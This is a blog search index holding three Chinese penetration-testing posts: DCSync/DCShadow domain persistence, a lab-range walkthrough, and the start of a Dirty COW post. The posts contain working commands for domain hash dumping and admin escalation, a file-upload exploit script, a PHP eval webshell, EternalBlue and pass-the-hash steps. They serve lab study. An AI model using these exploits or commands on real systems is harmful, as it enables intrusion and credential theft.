<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DCSync</title>
    <url>/2023/04/12/DCSync/</url>
    <content><![CDATA[<h1 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p> 域内的数据都会更新的, 不同的域控之间相隔15分钟会同步一次数据</p>
<p><font color='red'>默认不允许从只读域控中获取数据, 因为只读域控是不能够复制同步数据给其他域控的</font></p>
<p>DCSync利用目录复制服务</p>
<p>目录复制服务是用来复制和管理数据的RPC协议</p>
<p>DCSync利用该协议的GetNCChanges接口向域控发起同步数据请求, 来获得域控的数据</p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>首先我们要知道的是, 不是所有的用户都有DCSync的权限的</p>
<p>默认这些组的用户有DCSync的权限</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><code class="hljs arcade">Administrators<br><br><span class="hljs-built_in">Domain</span> Admins<br><br>Enterprise Admins<br></code></pre></td></tr></table></figure>





<h3 id="赋予权限"><a href="#赋予权限" class="headerlink" title="赋予权限"></a>赋予权限</h3><p>当然这个权限是可以被给予的</p>
<p><strong><font color='red'>修改ACE即可</font></strong></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">DS-<span class="hljs-keyword">Replication</span>-<span class="hljs-keyword">Get</span>-Changes<br>可以复制不包括私密域数据的其他数据<br><br>DS-<span class="hljs-keyword">Replication</span>-<span class="hljs-keyword">Get</span>-Changes-<span class="hljs-keyword">All</span><br>可以复制域中任意数据<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230323155342305.png"  ><span class="image-caption">image-20230323155342305</span></p>
<p>输入要给予权限的用户</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230323155533805.png"  ><span class="image-caption">image-20230323155533805</span></p>
<p>最后赋予权限在下面的勾选”复制目录更改”和”复制目录更改所以项”</p>
<p>还有一种直接了当的方法给予权限</p>
<p>直接powershell跑脚本 (empire的powerview.ps1脚本)</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\powerview.ps1;<br><br><span class="hljs-keyword">Add</span>-DomainObjectAcl -TargetIdentity &#x27;DC=sayms,DC=local&#x27; -PrincipalIdentity test -Rights DCSync -<span class="hljs-keyword">Verbose</span><br></code></pre></td></tr></table></figure>







<h3 id="查找权限"><a href="#查找权限" class="headerlink" title="查找权限"></a>查找权限</h3><p>可以通过工具直接了当的找到用于DCSync权限的用户</p>
<p>使用AdFind</p>
<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm">AdFind.exe -s <span class="hljs-keyword">subtree </span>-<span class="hljs-keyword">b </span><span class="hljs-string">&quot;DC=sayms,DC=com&quot;</span> -sdna nTSecurityDescriptor -sddl+++ -sddlfilter <span class="hljs-comment">;;; &quot;Replicating Directory Changes&quot;;; -recmute</span><br></code></pre></td></tr></table></figure>



<p>使用Execute-ACLight2.bat, 直接运行就行</p>
<p>会生成结果文件</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230323211801807.png"  ><span class="image-caption">image-20230323211801807</span></p>
<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><p>因为原理就是, 模仿域控去请求其他域控统一数据</p>
<p>直接运行脚本工具就行, 目的就是获取域用户的hash值</p>
<p><font color='red'>Impacket</font></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">获取所有用户<br>python3 secretsdump.py sayms<span class="hljs-operator">/</span>tom:admin<span class="hljs-variable">@12345</span><span class="hljs-variable">@192</span><span class="hljs-number">.168</span><span class="hljs-number">.8</span><span class="hljs-number">.4</span> <span class="hljs-operator">-</span>just<span class="hljs-operator">-</span>dc<br><br>获取具体用户<br>python3 secretsdump.py sayms<span class="hljs-operator">/</span>tom:admin<span class="hljs-variable">@12345</span><span class="hljs-variable">@192</span><span class="hljs-number">.168</span><span class="hljs-number">.8</span><span class="hljs-number">.4</span> <span class="hljs-operator">-</span>just<span class="hljs-operator">-</span>dc<span class="hljs-operator">-</span><span class="hljs-keyword">user</span> krbtgt<br></code></pre></td></tr></table></figure>



<p><font color='red'>mimikatz</font></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">获取所有用户<br>lsadump::dcsync /<span class="hljs-keyword">domain</span>:sayms.<span class="hljs-keyword">local</span> /<span class="hljs-keyword">all</span> /csv<br><br>获取具体用户<br>lsadump::dcsync /<span class="hljs-keyword">domain</span>:sayms.<span class="hljs-keyword">local</span> /<span class="hljs-keyword">user</span>:krbtgt<br></code></pre></td></tr></table></figure>



<p><font color='red'>powershell</font></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">Import-Module</span> .\<span class="hljs-built_in">Invoke-DCSync</span>.ps1;<br><br>导出所有<br><span class="hljs-built_in">Invoke-DCSync</span> <span class="hljs-literal">-DumpForest</span> | <span class="hljs-built_in">ft</span> <span class="hljs-literal">-wrap</span> <span class="hljs-literal">-autosize</span><br><br>导出具体<br><span class="hljs-built_in">Invoke-DCSync</span> <span class="hljs-literal">-DumpForest</span> <span class="hljs-literal">-Users</span> <span class="hljs-selector-tag">@</span>(<span class="hljs-string">&quot;krbtgt&quot;</span>) | <span class="hljs-built_in">ft</span> <span class="hljs-literal">-wrap</span> <span class="hljs-literal">-autosize</span><br></code></pre></td></tr></table></figure>





<h2 id="进行权限维持"><a href="#进行权限维持" class="headerlink" title="进行权限维持"></a>进行权限维持</h2><h3 id="DCSync-1"><a href="#DCSync-1" class="headerlink" title="DCSync"></a>DCSync</h3><p>可以想到, 如果我们拥有域管权限, 就可以任意指定DCSync权限</p>
<p>为用户添加DCSync权限</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\powerview.ps1;<br><br><span class="hljs-keyword">Add</span>-DomainObjectAcl -TargetIdentity &#x27;DC=sayms,DC=local&#x27; -PrincipalIdentity test -Rights DCSync -<span class="hljs-keyword">Verbose</span><br></code></pre></td></tr></table></figure>





<p>清除DCSync权限</p>
<figure class="highlight coq"><table><tr><td class="code"><pre><code class="hljs coq"><span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\powerview.ps1;<br><br><span class="hljs-keyword">Remove</span>-DomainObjectAc1 -TargetIdentity &#x27;DC=sayms,DC=local&#x27; -PrincipalIdentity test -Rights DCSync -<span class="hljs-keyword">Verbose</span><br></code></pre></td></tr></table></figure>







<h3 id="DCShadow"><a href="#DCShadow" class="headerlink" title="DCShadow"></a>DCShadow</h3><p>通过上面我们可以知道DCSync是通过模拟域控, 向其他域控请求同步数据, 从而获取信息</p>
<p>DCShadow就比较骚, 模拟域控, 通过域控直接的数据同步机制, 将自己预先设定的对象注入其他的域控中, 以此来创建后门</p>
<p><strong>将域普通用户提升为域管</strong></p>
<p>可以看到aim隶属于普通域用户组</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230412214112209.png"  ><span class="image-caption">image-20230412214112209</span></p>
<p>通过修改其primaryGroupID值, 使其称为域管</p>
<p>首先在任意一台域主机使用mimikatz, 以system权限运行</p>
<p>因为想要伪造域控, 是需要高权限的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">lsadump::dcshadow /object:CN=Aim,CN=Users,DC=sayms,DC=<span class="hljs-built_in">local</span> /attribute:primaryGroupID /value:512<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230412215353168.png"  ><span class="image-caption">image-20230412215353168</span></p>
<p>在用域管权限打开一个mimikatz窗口</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">lsadump:</span>:dcshadow /<span class="hljs-keyword">push</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230412215654137.png"  ><span class="image-caption">image-20230412215654137</span></p>
<p>然后就可以看到aim加入了域管组</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230412220711261.png"  ><span class="image-caption">image-20230412220711261</span></p>
]]></content>
      <categories>
        <category>权限维持</category>
      </categories>
      <tags>
        <tag>权限维持</tag>
      </tags>
  </entry>
  <entry>
    <title>i春秋Initial靶场</title>
    <url>/2023/03/25/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83Initial/</url>
    <content><![CDATA[<h1 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h1><p>首先访问</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230323224818098.png"  ><span class="image-caption">image-20230323224818098</span></p>
<p>想到的第一个是弱口令, burpsuite爆破admin密码, 失败</p>
<p>而且输入错误的账号密码直接弹出404</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230323225020214.png"  ><span class="image-caption">image-20230323225020214</span></p>
<p>也不存在SQL注入</p>
<p>想到可能就是骗人的登录框</p>
<p>上漏扫, 扫一下</p>
<p>Goby无果</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230323225227696.png"  ><span class="image-caption">image-20230323225227696</span></p>
<p>试试fscan</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230323225313555.png"  ><span class="image-caption">image-20230323225313555</span></p>
<p>显示存在thinkphp漏洞</p>
<p>拿thinkphp利用工具检测一下</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230323225423612.png"  ><span class="image-caption">image-20230323225423612</span></p>
<p>确认存在</p>
<p>可以直接RCE了</p>
<p>直接getshell</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324094819218.png"  ><span class="image-caption">image-20230324094819218</span></p>
<p>蚁剑连接</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324094841684.png"  ><span class="image-caption">image-20230324094841684</span></p>
<p>找flag, 发现目前能够访问的文件夹是没有的</p>
<p>root文件夹, 无法访问</p>
<p>发现权限是非常低的</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324095220677.png"  ><span class="image-caption">image-20230324095220677</span></p>
<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>上传linux漏洞扫描脚本, 执行</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324121256088.png"  ><span class="image-caption">image-20230324121256088</span></p>
<p>发现一大堆</p>
<p>都试了一下, 不能用, 有的是误报了</p>
<p>内核漏洞无法提权的话, 就考虑sudo提权</p>
<p>首先查看<font color='red'>etc/sudoers.d</font>文件夹</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324212408097.png"  ><span class="image-caption">image-20230324212408097</span></p>
<p>有文件, 但是是不可读的, 应该是权限不够</p>
<p>使用命令查看给予sudo的组件</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">sudo -l</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324212536676.png"  ><span class="image-caption">image-20230324212536676</span></p>
<p>发现**<font color='red'>mysql</font>**,可以免密使用</p>
<p>那么我们就可以使用mysql执行高权限命令了</p>
<p>查看是否具有高权限</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> mysql -e <span class="hljs-string">&#x27;\! id&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324212953546.png"  ><span class="image-caption">image-20230324212953546</span></p>
<p>可以执行高权限语句了, 那么现在我们来查看一下神秘的flag</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">sudo</span> mysql -e <span class="hljs-string">&#x27;\! find / -name flag&#x27;</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324213423749.png"  ><span class="image-caption">image-20230324213423749</span></p>
<p>直接查看呗</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324213523403.png"  ><span class="image-caption">image-20230324213523403</span></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324213601061.png"  ><span class="image-caption">image-20230324213601061</span></p>
<p>发现第一部分flag</p>
<figure class="highlight maxima"><table><tr><td class="code"><pre><code class="hljs maxima">flag&#123;<span class="hljs-number">60b53231</span>-<br></code></pre></td></tr></table></figure>





<h1 id="移交msf"><a href="#移交msf" class="headerlink" title="移交msf"></a>移交msf</h1><p>这个命令行能够执行的东西有限</p>
<p>我们移交msf</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324214029807.png"  ><span class="image-caption">image-20230324214029807</span></p>
<p>执行木马反弹shell</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324214100610.png"  ><span class="image-caption">image-20230324214100610</span></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324214119892.png"  ><span class="image-caption">image-20230324214119892</span></p>
<h1 id="探测内网"><a href="#探测内网" class="headerlink" title="探测内网"></a>探测内网</h1><p>寻找其他网段</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">run</span> get_local_subnets<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324220510275.png"  ><span class="image-caption">image-20230324220510275</span></p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ifconfig</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324220746355.png"  ><span class="image-caption">image-20230324220746355</span></p>
<p>查看现有网段</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">run post<span class="hljs-regexp">/multi/m</span>anage/autoroute<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324222519103.png"  ><span class="image-caption">image-20230324222519103</span></p>
<p>寻找存活端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> auxiliary/scanner/portscan/tcp<br><span class="hljs-attribute">set</span> rhosts <span class="hljs-number">172.22.1.0</span>/<span class="hljs-number">24</span><br><span class="hljs-attribute">set</span> ports <span class="hljs-number">22</span>,<span class="hljs-number">23</span>,<span class="hljs-number">80</span>,<span class="hljs-number">443</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">8081</span>,<span class="hljs-number">3389</span>,<span class="hljs-number">445</span>,<span class="hljs-number">143</span>,<span class="hljs-number">6379</span><br><span class="hljs-attribute">set</span> threads <span class="hljs-number">20</span><br><span class="hljs-attribute">run</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324223009195.png"  ><span class="image-caption">image-20230324223009195</span></p>
<p>172.22.1.15是自己</p>
<p>所以另外存在的就是</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.1.2</span><br><span class="hljs-number">172.22.1.18</span><br><span class="hljs-number">172.22.1.21</span><br></code></pre></td></tr></table></figure>



<h1 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h1><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">background    <span class="hljs-comment">#退出会话</span><br>use auxiliary/server/socks_proxy<br><span class="hljs-built_in">set</span> srvhost 服务器ip<br><span class="hljs-built_in">set</span> srvport 9999     	                           <span class="hljs-comment">#3333接口对外开放</span><br>exploit<br></code></pre></td></tr></table></figure>

<p>msf设置代理失败</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324223910561.png"  ><span class="image-caption">image-20230324223910561</span></p>
<p>考虑FRP反向代理吧</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324225926049.png"  ><span class="image-caption">image-20230324225926049</span></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324225948049.png"  ><span class="image-caption">image-20230324225948049</span></p>
<p>frp一级代理配置</p>
<p>frps.ini</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324230019996.png"  ><span class="image-caption">image-20230324230019996</span></p>
<p>frpc.ini</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324230040887.png"  ><span class="image-caption">image-20230324230040887</span></p>
<p>配置proxychains4.conf</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324230130372.png"  ><span class="image-caption">image-20230324230130372</span></p>
<p>浏览器设置代理</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324230229996.png"  ><span class="image-caption">image-20230324230229996</span></p>
<p>然后挨个访问上面拿三个ip</p>
<p>只有172.22.1.18成功</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230324230316197.png"  ><span class="image-caption">image-20230324230316197</span></p>
<p>说明其他两个可能是服务器, 也可能是普通主机, 也可能是域控</p>
<h1 id="OA系统"><a href="#OA系统" class="headerlink" title="OA系统"></a>OA系统</h1><p>查了一下这个版本的OA系统是存在的, 可以直接RCE</p>
<p>但前提是进入后台</p>
<p>一个弱口令就进来了</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">admin</span>  admin123<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230325145756645.png"  ><span class="image-caption">image-20230325145756645</span></p>
<p>找到文件上传点</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230325165059927.png"  ><span class="image-caption">image-20230325165059927</span></p>
<p>直接使用大佬写的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br>session = requests.session()<br><br>url_pre = <span class="hljs-string">&#x27;http://172.22.1.18/&#x27;</span><br>url1 = url_pre + <span class="hljs-string">&#x27;?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=533953&#x27;</span><br>url2 = url_pre + <span class="hljs-string">&#x27;/index.php?a=upfile&amp;m=upload&amp;d=public&amp;maxsize=100&amp;ajaxbool=true&amp;rnd=798913&#x27;</span><br>url3 = url_pre + <span class="hljs-string">&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=11&#x27;</span><br><br>data1 = &#123;<br>    <span class="hljs-string">&#x27;rempass&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;jmpass&#x27;</span>: <span class="hljs-string">&#x27;false&#x27;</span>,<br>    <span class="hljs-string">&#x27;device&#x27;</span>: <span class="hljs-string">&#x27;1625884034525&#x27;</span>,<br>    <span class="hljs-string">&#x27;ltype&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminuser&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4=&#x27;</span>,<br>    <span class="hljs-string">&#x27;adminpass&#x27;</span>: <span class="hljs-string">&#x27;YWRtaW4xMjM=&#x27;</span>,<br>    <span class="hljs-string">&#x27;yanzm&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span><br>&#125;<br><br><br>r = session.post(url1, data=data1)<br>r = session.post(url2, files=&#123;<span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.php&#x27;</span>, <span class="hljs-string">&#x27;r+&#x27;</span>)&#125;)<br><br>filepath = <span class="hljs-built_in">str</span>(r.json()[<span class="hljs-string">&#x27;filepath&#x27;</span>])<br>filepath = <span class="hljs-string">&quot;/&quot;</span> + filepath.split(<span class="hljs-string">&#x27;.uptemp&#x27;</span>)[<span class="hljs-number">0</span>] + <span class="hljs-string">&#x27;.php&#x27;</span><br><span class="hljs-built_in">id</span> = r.json()[<span class="hljs-string">&#x27;id&#x27;</span>]<br><br>url3 = url_pre + <span class="hljs-string">f&#x27;/task.php?m=qcloudCos|runt&amp;a=run&amp;fileid=<span class="hljs-subst">&#123;<span class="hljs-built_in">id</span>&#125;</span>&#x27;</span><br><br>r = session.get(url3)<br>r = session.get(url_pre + filepath + <span class="hljs-string">&quot;?1=system(&#x27;dir&#x27;);&quot;</span>)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure>



<p>木马文件命名为1.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;1&quot;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>



<p>使用windows跑一直无法完成, 应该是python的一些文件无法被代理</p>
<p>使用kali才成功</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230325165329260.png"  ><span class="image-caption">image-20230325165329260</span></p>
<p>木马已经写入</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230325165409291.png"  ><span class="image-caption">image-20230325165409291</span></p>
<p>蚁剑代理连接</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230325165615470.png"  ><span class="image-caption">image-20230325165615470</span></p>
<p>找到flag</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230325165713923.png"  ><span class="image-caption">image-20230325165713923</span></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2ce3</span>-<span class="hljs-number">4813</span>-<span class="hljs-number">87</span>d4-<br></code></pre></td></tr></table></figure>



<p><strong><font color='red'>分享一个flag思路</font></strong></p>
<p>靶场的flag, 一般存在于根目录</p>
<p>根目录没有, 就去那些高权限才能访问的目录</p>
<p>linux的root</p>
<p>windows的administrator</p>
<p>一般就在这些地方</p>
<p>这个地方也没有提权</p>
<p>那么这台机器拿下, 现在还剩下两台</p>
<figure class="highlight accesslog"><table><tr><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.1.21</span><br><br><span class="hljs-number">172.22.1.2</span><br></code></pre></td></tr></table></figure>



<h1 id="横向"><a href="#横向" class="headerlink" title="横向"></a>横向</h1><p>此时我们对另外两台机子没有任何信息</p>
<p>只能先扫描</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230325171851878.png"  ><span class="image-caption">image-20230325171851878</span></p>
<p>结果</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230325172004584.png"  ><span class="image-caption">image-20230325172004584</span></p>
<p>按照靶场出题人的思路, 想直接拿到域控很困难</p>
<p>我们先拿win7</p>
<p>根据我们的扫描结果, win7是存在永恒之蓝的</p>
<h1 id="永恒之蓝"><a href="#永恒之蓝" class="headerlink" title="永恒之蓝"></a>永恒之蓝</h1><p>直接msf利用是最方便的</p>
<p>记得使用proxychains4打开msf</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">search</span> ms17 <span class="hljs-number">010</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230325173503544.png"  ><span class="image-caption">image-20230325173503544</span></p>
<p>直接利用</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><code class="hljs gradle">use exploit<span class="hljs-regexp">/windows/</span>smb/ms17_010_eternalblue<br>show <span class="hljs-keyword">options</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230325173848045.png"  ><span class="image-caption">image-20230325173848045</span></p>
<p>配置一下参数, 就直接用了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp_uuid<br><span class="hljs-built_in">set</span> RHOSTS 172.22.1.21<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230325174555756.png"  ><span class="image-caption">image-20230325174555756</span></p>
<p>接下来, 想到的就是hash传递攻击了</p>
<h1 id="哈希传递"><a href="#哈希传递" class="headerlink" title="哈希传递"></a>哈希传递</h1><h2 id="DCSync"><a href="#DCSync" class="headerlink" title="DCSync"></a>DCSync</h2><p>使用DCSync攻击获取域内hash</p>
<p>使用我们熟悉的mimikatz</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">load kiwi<br>kiwi_cmd <span class="hljs-string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></td></tr></table></figure>

<p>很奇怪的是我获取不到hash值</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230325181730638.png"  ><span class="image-caption">image-20230325181730638</span></p>
<p>重新开启了环境还是不行, 估计是靶场问题, 不够稳定</p>
<p>直接hash传递就行, 用之前测获取的hash</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python3</span> wmiexec.py xiaorang/administrator@<span class="hljs-number">172.22.1.2</span> -hashes :<span class="hljs-number">10</span>cf89a850fb1cdbe6bb432b859164c8<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230325185235344.png"  ><span class="image-caption">image-20230325185235344</span></p>
<p>找hash</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230325185535661.png"  ><span class="image-caption">image-20230325185535661</span></p>
<figure class="highlight dns"><table><tr><td class="code"><pre><code class="hljs dns">e8f<span class="hljs-number">88d0d43d6</span>&#125;<br></code></pre></td></tr></table></figure>



<p>最后把得到的flag拼接就行</p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2016-5195 脏牛提权（Dirty Cow）</title>
    <url>/2023/03/21/CVE-2016-5195%20%E8%84%8F%E7%89%9B%E6%8F%90%E6%9D%83%EF%BC%88Dirty%20Cow%EF%BC%89/</url>
    <content><![CDATA[<h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><p>首先用nmap扫描</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.232.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230102161738555.png"  ><span class="image-caption">image-20230102161738555</span></p>
<p>知道了IP地址之后，然后查看开放了哪些端口</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">1</span>-<span class="hljs-number">65535</span> <span class="hljs-number">192.168.232.139</span><br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230102162111921.png"  ><span class="image-caption">image-20230102162111921</span></p>
<p>扫到了1898端口</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230102162151975.png"  ><span class="image-caption">image-20230102162151975</span></p>
<p>发现是一个网站</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230102162220806.png"  ><span class="image-caption">image-20230102162220806</span></p>
<p>这时就直接百度，看看这个站历史有没有曝出什么漏洞</p>
<h1 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h1><p>百度发现drupal是存在漏洞的</p>
<p>用msf</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230102164309247.png"  ><span class="image-caption">image-20230102164309247</span></p>
<p>发现可用的exp还是挺多的，一个一个试就行</p>
<p>直接使用2018的那个</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230102164435160.png"  ><span class="image-caption">image-20230102164435160</span></p>
<p>设置参数</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230102164707442.png"  ><span class="image-caption">image-20230102164707442</span></p>
<p>拿到shell</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230102164732597.png"  ><span class="image-caption">image-20230102164732597</span></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230102164921100.png"  ><span class="image-caption">image-20230102164921100</span></p>
<p>发现tmp目录</p>
<p>tmp目录是临时文件目录，可读可写可执行，重启之后目录会清空</p>
<p>发现是linux系统</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230102175154587.png"  ><span class="image-caption">image-20230102175154587</span></p>
<h1 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h1><p>此时上传linux的漏洞探测脚本</p>
